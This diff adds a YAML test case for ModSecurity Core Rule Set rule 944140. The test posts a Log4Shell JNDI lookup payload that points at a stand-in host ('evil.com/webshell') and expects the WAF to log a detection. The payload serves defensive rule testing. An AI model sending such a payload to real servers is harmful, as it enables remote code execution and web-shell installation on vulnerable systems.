@@ -1,0 +1,26 @@
+---
+  meta:
+    author: "dune73"
+    enabled: true
+    name: "944140.yaml"
+    description: "Description"
+  tests:
+
+    -
+      test_title: 944140-1
+      desc: Log4J exploit on arg foo
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              headers:
+                Accept: "*/*"
+                Host: localhost
+                User-Agent: ModSecurity CRS 3 Tests
+              method: POST
+              port: 80
+              uri: /
+              data: foo=${jndi:ldap://evil.com/webshell}
+            output:
+              log_contains: "id \"944140\""
